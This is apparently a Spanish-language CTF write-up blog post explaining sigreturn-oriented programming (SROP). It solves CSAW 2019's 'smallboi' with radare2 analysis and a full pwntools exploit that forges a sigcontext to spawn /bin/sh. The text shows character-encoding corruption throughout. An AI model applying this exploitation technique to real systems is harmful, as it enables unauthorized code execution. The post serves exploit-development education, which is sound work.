I"¡6<p class="lead">Resolucion de un ejercicio aplicando la tecnica SROP, para ejecutar un sigcontext falso y conseguir una shell</p>

<h2 id="se√±ales">Se√±ales</h2>

<p>Las se√±ales son un mecanismo para enviar notificaciones asincr√≥nicas directamente a un proceso o subproceso. Este se utilizan para matar procesos, para decirles que los temporizadores han expirado o para notificar sobre un comportamiento anormal.</p>

<h3 id="funcion-de-las-se√±ales">Funcion de las se√±ales</h3>

<p><img src="/assets/img/srop/se%C3%B1al.webp" alt="" /></p>

<ol>
  <li>
    <p>Cuando se tiene un proceso previamente creado, lo que se hace primero es que el kernel envia una se√±al a ese proceso, el proceso se suspende temporalmente y entrara en el kernel</p>
  </li>
  <li>
    <p>Despues, el kernel guarda el contexto de ese proceso y salta al controlador de la se√±al (este ya debe de estar previamente definido)</p>
  </li>
  <li>
    <p>Cuando se vuelve e pasar el kernel, el controlador de la se√±al regresa, y el kernel restaura el contexto del proceso</p>
  </li>
  <li>
    <p>Ejecucion del proceso</p>
  </li>
</ol>

<p>Del paso 2 al 3 es la clave. SROP abusa de <code class="language-plaintext highlighter-rouge">sigreturn()</code> por que normalmente restaura el contexto del proceso despues de que regresa el controlador de se√±al, esto funciona mas o menos asi:</p>

<p>El kernel guarda el contexto del proceso en el stack del proceso, luego se usa la direccion de <code class="language-plaintext highlighter-rouge">rt_sigreturn</code> en el top del stack, esta direccion apunta a un fragmento de codigo en el que <code class="language-plaintext highlighter-rouge">sigreturn()</code> llamara a sistema. Despues del paso 3, el RSP o ESP apunta a <code class="language-plaintext highlighter-rouge">rt_sigreturn</code> y ejecuta el <code class="language-plaintext highlighter-rouge">sigcontext</code></p>

<h3 id="srop">SROP</h3>

<p>SROP es una variante de ROP, pero en esta solo se deben de cumplir dos condiciones</p>

<ol>
  <li>Un gadget <code class="language-plaintext highlighter-rouge">syscall; ret</code></li>
  <li>Una manera de poner <code class="language-plaintext highlighter-rouge">0xf</code> en <code class="language-plaintext highlighter-rouge">RAX</code> o <code class="language-plaintext highlighter-rouge">EAX</code></li>
</ol>

<p>Dos de las formas mas usadas para poner <code class="language-plaintext highlighter-rouge">0xf</code> en <code class="language-plaintext highlighter-rouge">RAX</code> son:</p>

<ol>
  <li>Usar <code class="language-plaintext highlighter-rouge">mov eax, 0xf</code></li>
  <li>Usar <code class="language-plaintext highlighter-rouge">pop eax; ret</code></li>
</ol>

<p>Ambas son faciles de implementar, ya que meten <code class="language-plaintext highlighter-rouge">0xf</code> en una sola acccion.
Y el <code class="language-plaintext highlighter-rouge">0xf</code> simplemente es el <code class="language-plaintext highlighter-rouge">syscall ID de rt_sigreturn</code>.</p>

<h2 id="como-funciona">Como funciona</h2>

<p>Aun que es similar a ROP, no funcionan de la misma forma, SROP funciona poniendo en el call stack un <code class="language-plaintext highlighter-rouge">sigcontext</code> pero falso. y luego sobrescribir el <code class="language-plaintext highlighter-rouge">RIP</code> o <code class="language-plaintext highlighter-rouge">EIP</code> con la direccion de un gadget que permita llamar a <code class="language-plaintext highlighter-rouge">sigreturn()</code>, y se apunta a <code class="language-plaintext highlighter-rouge">sigreturn()</code> ya que este permite ejecutar el <code class="language-plaintext highlighter-rouge">sigcontext</code>, realmente esto es muy poderoso, ya que con SROP podemos controlar al mismo tiempo todos los valores de los registros. Y cuando digo <code class="language-plaintext highlighter-rouge">sigcontext</code>, me refiero a esto:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">sigcontext_64</span> <span class="p">{</span>
	<span class="n">__u64</span>				<span class="n">r8</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">r9</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">r10</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">r11</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">r12</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">r13</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">r14</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">r15</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">di</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">si</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">bp</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">bx</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">dx</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">ax</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">cx</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">sp</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">ip</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">flags</span><span class="p">;</span>
	<span class="n">__u16</span>				<span class="n">cs</span><span class="p">;</span>
	<span class="n">__u16</span>				<span class="n">gs</span><span class="p">;</span>
	<span class="n">__u16</span>				<span class="n">fs</span><span class="p">;</span>
	<span class="n">__u16</span>				<span class="n">ss</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">err</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">trapno</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">oldmask</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">cr2</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">fpstate</span><span class="p">;</span>
	<span class="n">__u64</span>				<span class="n">reserved1</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">};</span>
</code></pre></div></div>
<p>Cuando el atacante crea un <code class="language-plaintext highlighter-rouge">sigcontext</code> falso, puede establecer cualquier valor de cada uno de esos registros</p>

<h2 id="explotacion">Explotacion</h2>

<p>Para el ejemplo usare un clasico, <code class="language-plaintext highlighter-rouge">smallboi</code> de CSAW 2019</p>

<p>Al ejecutarlo simplemente se queda esperando un input y se cierra, y al tratar de desbordar el buffer vemos que si se puede:</p>

<p><code class="language-plaintext highlighter-rouge">[1]    423456 segmentation fault (core dumped)  ./small_boi</code></p>

<p>Pero tiene NX asi que no podemos ejecutar una shellcode</p>

<h3 id="analizandolo">Analizandolo</h3>

<p>Al materlo al radare, vemos y hacer un <code class="language-plaintext highlighter-rouge">pdf</code> vemos algo como esto:</p>

<p><img src="/assets/img/srop/radare1.png" alt="" /></p>

<p>Esto simplemente es el entry point, y lo unico interesante es que en la direccion <code class="language-plaintext highlighter-rouge">0x004001b6</code> hace un llamado a <code class="language-plaintext highlighter-rouge">fcn.0040018c</code>, asi que vamos pa‚Äô alla</p>

<p><img src="/assets/img/srop/radare2.png" alt="" /></p>

<p>Este es su codigo, basicamente el binario hacer una syscall de <code class="language-plaintext highlighter-rouge">read()</code>, la cual es la funcion que recibe nuestro input, la cual lee <code class="language-plaintext highlighter-rouge">0x200</code> bytes que vienen de <code class="language-plaintext highlighter-rouge">var_20h</code></p>

<h3 id="sacando-el-offset-el-rip">Sacando el offset el RIP</h3>

<p>Esta es la parte mas sencilla, asi que realmente no requiere mucha explicacion, lo que hice fue:</p>

<ol>
  <li>Usando pwndbg genere con <code class="language-plaintext highlighter-rouge">cyclic 100</code> una secuencia de 100 caracteres que le pase como input al programa</li>
  <li>Usando <code class="language-plaintext highlighter-rouge">cyclic -l</code>  y 8 bytes de el RSP obtuve su offset</li>
</ol>

<p>Y bueno, el offset para llegar al RIP es 40</p>

<h3 id="sacando-el-gadget">Sacando el gadget</h3>

<p>El binario apenas si tiene instrucciones y por consiguiente apenas y tendra los gadgets que son usados comunmente jaja, asi que ahora queda mostrar los gadgets usando <code class="language-plaintext highlighter-rouge">/R</code> en radare, a ver que onda.</p>

<p>Despues de ver los gadgets nos encontramos con el que usaremos:</p>

<p><img src="/assets/img/srop/radare3.png" alt="" /></p>

<p>Aqui esta todo lo que ocupamos, este unico gadget hace las dos condiciones que mencion al principio, ya que establece a <code class="language-plaintext highlighter-rouge">EAX</code> el nuemero de la syscall equivalente a <code class="language-plaintext highlighter-rouge">sigreturn()</code> y la invoca. Tambien como mencione antes, en SROP se crear un <code class="language-plaintext highlighter-rouge">sigcontext</code> falso, asi que en esta caso haremos uno falso llamando a <code class="language-plaintext highlighter-rouge">execve()</code> con el arguemento <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>

<p>Para sacar <code class="language-plaintext highlighter-rouge">/bin/sh</code> simplemente podemos <code class="language-plaintext highlighter-rouge">/ /bin/sh</code> y vemos que nos arroja algo como esto:</p>

<p><img src="/assets/img/srop/radare4.png" alt="" /></p>

<p>Donde la direccion de <code class="language-plaintext highlighter-rouge">/bin/sh</code> es la que esta seleccionada</p>

<h2 id="exploit">Exploit</h2>

<p>Al conseguir todo, nuestro exploit queda asi:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./small_boi"</span><span class="p">)</span>

<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x4001ca</span>
<span class="n">sigreturn</span> <span class="o">=</span> <span class="mh">0x400180</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x400185</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">40</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>

<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bin_sh</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Y los valores salieron de aca:</p>

<p><img src="/assets/img/srop/radare5.png" alt="" /></p>

<p>Con <code class="language-plaintext highlighter-rouge">SigreturnFrame</code> Podemos crear un <code class="language-plaintext highlighter-rouge">sigcontext</code> falso, donde se establece <code class="language-plaintext highlighter-rouge">rax</code> a 59 (para execve), <code class="language-plaintext highlighter-rouge">rdi</code> a la direcci√≥n del <code class="language-plaintext highlighter-rouge">/bin/sh</code>, <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code> ambos a 0, y <code class="language-plaintext highlighter-rouge">rip</code> hacia la <code class="language-plaintext highlighter-rouge">syscall</code>, esto con el fin de que la <code class="language-plaintext highlighter-rouge">rt_sigreturn</code> syscall cambie de contexto usando estos valores del falso <code class="language-plaintext highlighter-rouge">sigcontext</code>, llamando as√≠ a <code class="language-plaintext highlighter-rouge">execve</code> con <code class="language-plaintext highlighter-rouge">/bin/sh</code>. :point_up: ü§ì</p>

<p>Y el ejecutarlo nos da la shell:</p>

<p><img src="/assets/img/srop/exploit.png" alt="" /></p>

<p>Eso ha sido todo, gracias por leer ‚ù§</p>
:ET